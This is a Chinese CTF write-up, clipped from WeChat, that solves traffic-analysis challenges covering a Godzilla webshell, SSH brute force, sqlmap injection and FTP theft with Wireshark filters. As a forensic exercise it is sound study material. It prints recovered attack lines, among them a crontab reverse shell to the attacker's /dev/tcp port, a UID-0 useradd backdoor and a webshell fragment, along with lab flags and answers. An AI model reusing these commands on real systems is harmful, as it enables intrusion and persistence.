---
title: 【微信】好靶场杯第一届综合赛道（流量分析-古法赛道）详细版Wireup
source: https://mp.weixin.qq.com/s/D4YSX_1-ZpcbT5WmYfcXkg
source_host: mp.weixin.qq.com
clip_date: 2026-07-23T13:25:08+08:00
trace_id: 445fb05d-73b5-4f73-a464-e9e5d05ff308
content_hash: 54f4dded0ce6ef9c98ce6b3d2dcfb5ab6d48a7770900853617f8f5ced27d1255
status: summarized
tags:
  - 微信
  - CTF
  - 协议分析
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: 本文详细解析了好靶场杯CTF流量分析赛道的解题过程，通过分析多种协议流量提取攻击细节和flag。
ai_summary_style: key-points
images_status:
  total: 167
  succeeded: 167
  failed_urls: []
notion_page_id: 3a675244-d011-81a1-bcd4-e71194a4f9e4
ioc:
  cves: []
  cwes: []
  hashes:
    - 0c6ae9233f9e45388bcaf3cba798f7e5
    - 18a55236ec494ba53238da9613bb9aae
    - 420e8a8c540d4be07f0221f46ccfb8ee
    - 508e95350d8a42c382f9560218d07b5d
    - 65180bb0b2a30d0160488c1a997a470a
    - 69469a326b174b14821f1c5feeb95855
    - 8c36f93fd66947db8ac8ba1f69f54d5f
    - e10adc3949ba59abbe56e057f20f883e
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> 本文详细解析了好靶场杯CTF流量分析赛道的解题过程，通过分析多种协议流量提取攻击细节和flag。
> 
> - **工具与方法**：使用Wireshark过滤命令结合lovelyspark、CyberChef等工具，解密哥斯拉、冰蝎等Webshell流量。
> - **攻击链路**：攻击者通过fscan内网扫描，利用WebStack主题漏洞上传哥斯拉Webshell，植入隐藏账户和计划任务后门。
> - **暴力破解**：SSH和FTP服务遭受Hydra工具暴力破解，成功登录后建立反弹Shell、写入公钥后门。
> - **数据提取**：SQL注入使用sqlmap枚举数据库表获取flag，FTP窃取敏感文件，键盘取证还原用户密码和攻击命令。
> - **解密技术**：USB流量通过镜像翻转解码，DNS流量使用AES-ECB加密，需提取密钥解密获得flag。

编者荐语：

虽然报名了，但是我太懒了，连签到题都没做

**泷羽Sec-静安** *2026年7月23日 13:11*

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/302328cafa47a7ba.gif)

**前言：**

***今天这篇是好靶场杯-流量分析部分，钓鱼邮件该师傅1血！***

***本次文章由：yuiiijuk师傅提供文档，修改了一上午！***

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/8d1a4d984a52ab0b.png)

* * *

完成度：流量分析完成 7/8

最后那个钓鱼流量，因为有 56问，题量大，难度比较高涉及多个过滤手法和分析思路，在比赛结束后，才后续完成。不进行公开分享全方位细节分析

比赛结束的 11分钟后完成该题。

接下来我将细节的讲解剩下 7道流量题做题思路和做题流程

问题有些比赛的时候不够详细，我是在结束后的靶场进行细节补充。

* * *

所需工具：

Wireshark/lovelyspark/CTF-NetA（付费）/CyberChef

任意一款解冰蝎，哥斯拉流量的工具（免费）

PS:在我写完wp的时候，lovelyspark完成了更新，usb以及各种bug修复好了，可以完成该古法赛道所有流量题解密。

本次 wp的过滤命令，默认已经搜索学习，不展开详细讲解，可以从wireshark官方wiki或者CSDN、本公众号以往文章等一系列平台进行学习。

技术有限，有些题会标注是否可以用不付费软件去做， USB那种网上有python脚本也可以实现非付费去做，付费软件也是一个个脚本去完成功能实现，只不过更加方便快速。

* * *

Webshell3：

(此题wp有非付费软件的做法)

1.提交攻击者IP地址

点统计 \-> IPv4->ALL addresses（找流量最大、主动连接最多的一方）

看到 192.168.99.28 <-> 192.168.99.59 流量最大

2.提交受害服务器 IP 地址

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/63c99afe9b4c3c40.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/69b624b8024d422b.png)

参考上一题

3.攻击者使用什么工具进行了内网资产探测？

使用命令：icmp || arp || tcp.flags.syn == 1 进行过滤

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/4abbe1a41745e666.png)

看到.28对整个192.168.99.0/24 做ARP/ICMP 探活。

随后批量探测 80,135,139,445,3306,5985,3389等端口。

这种 “先探活、再扫端口、再识别服务”的行为特征是 fscan。

4.攻击者内网扫描了哪些存活主机 IP？（从小到大，逗号分隔）

过滤 ICMP 回包

icmp.type == 0 && ip.dst == 192.168.99.28

可见回包主机：.58,.59,.60,.61,.62,.128

.254 也有 ARP 应答，是网关/DHCP 相关存活主机

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/3be1ea8bfa7a7a80.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/320ad152644c3354.png)

5.受害服务器开放了哪些端口？（从小到大，逗号分隔）

使用过滤规则：

```apache
ip.src == 192.168.99.59 && ip.dst == 192.168.99.28 && tcp.flags.syn == 1 && tcp.flags.ack == 1
```

过滤受害机返回 SYN-ACK，

看到.59 对扫描返回开放端口：80,135,139,445,3306,5985

后续再过滤 RDP

tcp.port == 3389 && ip.addr == 192.168.99.59

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/2e65eeeba7f10b35.png)

看到攻击者成功 连 3389

6.受害服务器 Web 中间件及版本是什么？

http.response 过滤HTT P 响应，追踪流

7.受害服务器使用的 WordPress 主题名称和版本号是什么？

http.request.uri contains "themes" 过滤主题资源

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/253b00fdeebb27c8.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/be96243f8cf4c092.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/c57e4a01f2d3bda8.png)

8.攻击者利用了哪个 CVE 漏洞？

从第 上一 题知道主题是 WebStack 1.2024

搜索该主题版本和接口 ， 可对应 WebStack任意文件上传漏洞。

9.攻击者漏洞利用的完整请求路径（含参数）是什么？  

http.request.method == "POST"过滤 找上传 Webshell 前后的 POST

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/6c5c229d0555d679.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/355b1f01c4eac5c5.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/85d953032d61ecd8.png)

看到攻击者请求 / wp-admin/admin-ajax.php?action=img_upload

10.攻击者上传 Webshell 时使用的客户端工具是什么？

追踪该流即可找到

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/1f04ddcda7b1a184.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/f513643df9821117.png)

11.攻击者上传的 Webshell 在服务器上的完整 URL 是什么？

参照上上题过滤，即可找到

http.request.method == "POST"

12.攻击者上传的 Webshell 原始文件名是什么？

还是之前的过滤,追踪一开始上传的 http流

可以找到 web.php

13.攻击者使用的 Webshell 管理工具是什么？

查看上传的 web.php内容里面有典型哥斯拉结构：

```perl
$payloadName='payload';$key='...';@run($data)
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/cd7dfeef02bb52e0.png)

提交英文： Godzilla

14.该工具使用的加密方式是什么？

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/dd1c6d73579bdcbc.png)

首先是上传的 PHP壳

```php
function encode($D,$K){$D[$i] = $D[$i]^$c;}
```

关于 xor的编码，请求体是 raw body

哥斯拉加密器： PHP_XOR_RAW

15.哥斯拉的连接 密码 是什么？

如上面代码，密码是key

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/effff630c81c98ce.png)

16.受害服务器有多少张网卡？

将哥斯拉流量解密即可，后续除了最后两道题都是

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/61697c18868eae2a.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/27323ee4eed5e669.png)

17.受害服务器的主机名是什么？

WIN-5CNHCFAIMP9

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/e85ec410a7ae5d1c.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/ba29ceba1b3ac2c6.png)

18.攻击者通过 Webshell 读取了 WordPress 配置文件，数据库用户名和密码分别是什么？

wordpress/123456

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/e21a7a7478c2b919.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/b55a41a0bcf201a8.png)

19.攻击者创建的隐藏后门账户完整用户名是什么？

AdminJIU$

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/a1e2f5c452dd5c20.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/106b165c8986256f.png)

20.该后门账户的密码是什么？

Admin@12345!

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/4820eecf73e1600c.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/ef6744d90e173d98.png)

21.攻击者上传的伪装成系统服务的后门脚本文件名是什么？

WinDefenderHealthCheck.bat

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/1e6bf2cfdef78a32.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/03f20d4f2ae2ba24.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/191b10ea762cdf1b.png)

22.该后门脚本的回连地址是什么？

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/645b88c9bc9dfabe.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/f906d2be6ee66bd6.png)

23.攻击者后门脚本使用什么 Windows 工具下载回连载荷？

c ertutil

24.攻击者创建的计划任务后门中隐藏的 flag 是什么？

flag{65180BB0B2A30D0160488C1A997A470A}

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/01246f0d0c2668a0.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/845400c44cd61cc6.png)

25.攻击者在 RDP 会话中使用 certutil 下载的两个伪装恶意文件原始文件名是什么？

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/88f98d604637b3db.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/65a80d1e9c6b77dc.png)

原神.exe-植物大战僵尸杂交版v2.1安装包.exe

先找 RDP：tcp.port == 3389

RDP 之后，过滤受害机访问攻击者 HTTP 服务

```apache
ip.src == 192.168.99.59 && ip.dst == 192.168.99.28 && tcp.port == 8080 && http.request
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/510a6125824ec47b.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/c8740ed4d47a1e92.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/af3c4fb1aae9d83f.png)

进行 url解密

26.攻击者下载恶意文件使用的 HTTP 服务是什么？

SimpleHTTP/0.6 Python/3.12.0

过滤攻击者 HTTP 服务响应,查看响应头

```apache
ip.src == 192.168.99.28 && tcp.srcport == 8080 && http.response
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/b8da0db8ebcc4771.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/d741fdf9a91ac3c6.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/0e5e202e19b19bfd.png)

该 flag为比赛后在靶场获取的flag

并非比赛时候flag，后续补的截图

* * *

SSH：

(此题wp有非付费软件的做法)

1.攻击者的 IP 地址是什么？

192.168.11.129

```nginx
arp && eth.dst == ff:ff:ff:ff:ff:ff
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/2860c8c1cbdbb473.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/fdc892567bbbc0f1.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/a56dfd30d267326f.png)

2.受害服务器的 IP 地址是什么？

192.168.11.96

```ini
ip.src == 192.168.11.129 && tcp
```

进行过滤，会发现这样的行为，都指向 96

但题目是ssh，所以我们要过滤一下22端口

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/be90e1f7a67953d1.png)

```apache
ip.addr == 192.168.11.96 && tcp.port == 22
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/e15b52465e181563.png)

确认为 192.168.11.96

3.攻击者对目标网段进行了存活主机探测，请写出扫描的网段

192.168.11.0/24

```apache
arp.opcode == 1 && arp.src.proto_ipv4 == 192.168.11.129
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/b914515c68472717.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/c8339d37739c7abf.png)

看目标的 ip字段就知道从11.0扫描到11.254，就是24网段

4.攻击者存活主机探测使用了什么协议？共发现多少台存活主机？

ARP-6

```apache
arp.opcode == 2 && arp.dst.proto_ipv4 == 192.168.11.129
```

可以看到有 6个ip

5.受害服务器开放了哪些端口？

22,80,443

```apache
ip.src == 192.168.11.129 && ip.dst == 192.168.11.96 && tcp.flags.syn == 1
```

先进行过滤，看有多少 syn的扫描

```apache
ip.src == 192.168.11.96 && ip.dst == 192.168.11.129 && tcp.flags.syn == 1 && tcp.flags.ack == 1
```

然后查看有多少 ack返回的端口

6.攻击者使用了什么工具进行 SSH 暴力破解（写出工具名称和 SSH 客户端标识）

Hydra-SSH-2.0-libssh_0.11.3

libssh_0.11.3是Hydra 的常用库，这个不了解可以去搜一下

```ini
tcp.port == 22 && ssh
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/2850701cb5fbe8a3.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/58e3b367942b00af.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/1fa9b0231d56fda4.png)

7.受害服务器的 SSH 服务版本是什么？

SSH-2.0-OpenSSH_10.0p2 Ubuntu-5ubuntu5.4

```apache
ip.src == 192.168.11.96 && tcp.srcport == 22 && ssh
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/17bf7312d6750d91.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/6da97fc0806779a0.png)

8.攻击者暴力破解共尝试了多少次密码？

30

```apache
ip.src == 192.168.11.129 && ip.dst == 192.168.11.96 && tcp.dstport == 22
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/68a727e267a76c78.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/f8ab34073bd33d10.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/0b4124738f0c1dd1.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/7c6ae5e67603627b.png)

找 SSH-2.0-libssh_0.11.3 为这个的数

通过过滤慢慢数，我数到 20就开始一直试错，30就通了

PS：根据出题人提供该题有错误

8.暴力破解阶段，攻击者使用 libssh 客户端标识发起了多少次 SSH 认证连接？

答案:20

过滤 ssh.protocol contains "libssh

按 \`tcp.stream\` 去重统计实际为 20次，已调整

9.攻击者暴力破解成功后登录的用户名是什么？

s anjiu

```apache
ip.src == 192.168.11.129 && ip.dst == 192.168.11.96 && tcp.dstport == 22
```

直接追踪最后一个流，一般这个就是成功的

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/2d1757d745c425a6.png)

点击下一个流，可以发现进入成功后的数据

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/2b4c7761161a3c22.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/5ad84b1c5c2a63f8.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/d7cddd09ba66379f.png)

10.攻击者进入反弹 Shell 后执行的第一条命令是什么？

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/512f9fb1f20b3635.png)

w hoami

这该流继续分析

会发现这是 4444端口的

tcp.port == 4444

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/bdbbfe34dec7ac07.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/ae1fd03c7e737a3f.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/fab835159670e324.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/5c6fb5491d3da159.png)

11.攻击者一共建立了几次反弹 Shell 连接？

2

```ini
tcp.port == 4444
```

过滤后会发现只有两个会话端口

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/83247ef5309f7c5e.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/ef18f9da592616df.png)

12.受害服务器的主机名是什么？

sanjiu-VMware-Virtual-Platform

在该数据里面一眼就能找到

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/9f6ed05710e92cb9.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/9671f48650a48669.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/1b3b9f313f3b1d24.png)

13.攻击者手动登录时使用的SSH 客户端标识是什么？

SSH-2.0-OpenSSH_10.2p1 Debian-3

```apache
ip.src == 192.168.11.129 && ip.dst == 192.168.11.96 && tcp.dstport == 22 && ssh
```

14.反弹 Shell 使用的端口号是什么？

4444

参考上面问题过程就有

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/05f12812155eb379.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/d6c5993986566677.png)

15.反弹 Shell 的连接方向是什么？（谁主动连接谁）

192.168.11.96-->192.168.11.129:4444

参考上面过滤规则

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/9f61cb9cad0b9b6f.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/023ea02bb22b4bc7.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/775468a35d60363b.png)

16.攻击者将 root 密码修改为了什么？

sanjiu@@@123

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/600eb081bed09789.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/cb4916379241c35d.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/9b9f8094d1ca9d67.png)

在该流继续寻找

17.攻击者创建的影子账户用户名和 UID 分别是什么？

sanJiu-0

参考问题 9过滤出来的流下拉就找到

用户名是 sanJiu，UID 是 0

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/1e8ddac0f4537739.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/3a837c2565ebfdf3.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/772a005ec1d638f7.png)

PS：该题根据出题人联系，已修改

Frame 6316（命令 \`useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sanJiu\`）、Frame 6399（\`cat /etc/passwd\` 输出显示 \`sanJiu:x:0:0::/root:/bin/bash\`）、Frame 6429（\`id sanJiu\` 输出 \`uid=0(root)\`）

18.攻击者写入的 Crontab 后门完整内容是什么？

\*/10 \* \* \* \* root bash -i >& /dev/tcp/192.168.11.129/9999 0>&1

继续在这个流下拉

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/b4dcab8607b02b72.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/a786a91d6a19b219.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/da1761a3232b801f.png)

19.攻击者 Crontab 后门的回连端口是什么？

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/633aeafdbe11dc9a.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/70999a25b5beb0a2.png)

9999

20.攻击者在受害机上创建的隐藏后门脚本完整路径是什么？

/tmp/.backdoor.sh

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/35fa34277f05dc68.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/fc20b8ee5fe3d6d4.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/87239fdb2d3b82d8.png)

下拉就可以找到

21.攻击者写入 SSH 公钥后门的公钥文件完整路径是什么？

/root/.ssh/authorized_keys

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/134e4b699ff32f37.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/de680687fa60623c.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/5ce2c0e5ee8b6f9c.png)

继续下拉找到

22.害机 /etc/shadow 文件中 root 用户的密码哈希值是什么？

```powershell
$y$j9T$HAiWkWk/MXH2ZeZDj9uXl1$jr4kDa9qVoVGC9kJb2U7tK7nHRcWQA/VdB6OoMl8d6C
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/6d4affc0f5afa5b6.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/aa10e707030ccebd.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/10f1edae2a69da59.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/6d5720d25d890a79.png)

该 flag为比赛后在靶场获取的flag

并非比赛时候flag，后续补的截图

flag{69469a326b174b14821f1c5feeb95855}

* * *

SQL注入流量分析：

SQL注入流量分析 (此题wp有非付费软件的做法)

1.提交攻击者 IP

192.168.9.25

选择分析 \-会话-ipv4即可找到攻击者ip

2,攻击者使用了什么工具进行攻击？提交工具名称和版本。

sqlmap/1.10#stable

```javascript
http.request
```

进行过滤,追踪该 HTTP流

3.攻击者针对哪个参数进行了注入？

c ategory

4.该注入使用了什么数据库函数？

PG_SLEEP

在之前问题过滤中可以看到

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/694e113166bea650.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/3306f9f26051816f.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/81e5dc0eca7e572f.png)

5.攻击者枚举出数据库中共有几张表？

5

```sql
http.request.uri contains "PG_SLEEP"http.request.uri contains "pg_tables"http.request.uri contains "pg_tables" && http.request.uri contains "tablename"
```

通过 ASCII(SUBSTRING(...)) >数字配合PG_SLEEP(1)判断真假

可以找到 5张表

Books,borrow_records,notices,secret_flag,users

要不断过滤找到开始翻就是 4错了，5对了

6.攻击者从哪张表中获取了 flag？提交表名。

secret_flag

这块也是翻 sql注入流量，我目前对于这个没有更好的解决办法

7.提交 flag。

flag{8673db96fa2dceeb}

```sql
http.request.uri contains "secret_flag"http.request.uri contains "flag_value"
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/521cc4e0ade7a315.png)

8.攻击者获取了管理员账户信息，管理员密码是什么？

123456

```sql
http.request.uri contains "public.users"http.request.uri contains "username"http.request.uri contains "%22role%22"http.request.uri contains "password"
```

还原出的 hash

e10adc3949ba59abbe56e057f20f883e

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/915332c0e56d7bd9.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/ca0f919498e33a17.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/905cea66754316c1.png)

该 flag为比赛后在靶场获取的flag，

并非比赛时候flag，后续补的截图

flag{8c36f93fd66947db8ac8ba1f69f54d5f}

* * *

FTP流量：

（此解法为付费软件解法）

1.提交攻击者IP

192.168.39.88

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/478ba1d99532d2be.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/3629355c720e1abc.png)

2.攻击者对哪个网段进行了存活探测？发现了多少台存活主机？

192.168.39.0/24,7

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/b77ca5e0033a684c.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/07136e5d9895f704.png)

3.受害服务器开放了哪些常见端口？

21,135,139,445,5985

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/ce819bc6e645bf29.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/7e95c53cbad76a45.png)

4.受害服务器的 FTP 服务软件和版本是什么？

FileZilla Server 0.9.60 beta

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/245e7dc2786cea9a.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/6d7e3e27d5b0feae.png)

PS：根据出题人联系，该题已修改

受害 服务器 FTP 服务 220 欢迎消息中显示的软件和版本信息是什么？

提交格式： \`注意有空格\`

答案： FileZilla Server 中文版 0.9.60 beta

位置： Frame 2639，过滤 \`ftp.response.code == 220\`

5.攻击者在暴力破解前使用 Nmap 脚本探测了 FTP 匿名登录，尝试的用户名是什么？

a nonymous

6.攻击者使用了什么工具进行暴力破解？

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/10f856cdc98283b8.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/d17204d9c93377fc.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/11051d51845ece6b.png)

Hydra

7.暴力破解的目标用户名和成功密码分别是什么？

ftpuser/ftp@2026

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/1f05bfa229940a27.png)

8.暴力破解共尝试了多少个密码？产生了多少次登录失败？

30,33

PS：文件已调整

过滤 \`ftp.request.command == "PASS"\` 统计（Frame 3457~4143 共 30 个不同密码）；过滤 \`ftp.response.code == 530\` 得到 33 次失败

看 pass数了，一开始蒙的31，30，我在30-35，30-35穷举到了。。。。

9.攻击者登录后浏览了哪些目录？

人事档案,财务报表,运维文档,项目投标

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/2c7c70efc20a7423.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/a63a12ec7d2f1b1b.png)

10.攻击者一共下载了几个文件？列出全部文件名。

5|README.txt,华章科技-2026年6月薪资明细.pdf,华章科技-2026年Q2财务报告.pdf,华章科技-内部系统凭据清单.pdf,华章科技-山东政务项目投标方案.pdf

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/be9bf5a3077e3aa5.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/7d7367b40955ca88.png)

11.攻击者下载 PDF 前切换了什么传输模式？

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/fee8afcd8a6e3066.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/5a4fc93ae2678ec6.png)

BINARY

12被窃取的财务报告中，公司 Q2 总营收是多少？

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/16491c1d8701599a.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/705f9c5b484c4fe6.png)

8743.2

13.被窃取的薪资表中，CEO 王建国的月薪总额是多少？

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/6c55ab267de5fc90.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/fd76709d86a73964.png)

110000

14.凭据文件中生产环境数据库主库的密码是什么？

PgMaster#2026db

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/3cfd6e0c454852ce.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/e3a94b5ce6b6135d.png)

15.投标文件中该项目的投标总价是多少？

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/e466f41122c6098b.png)

2350

16.被窃取的文件中隐藏的 flag 是什么？

flag{420E8A8C540D4BE07F0221F46CCFB8EE}

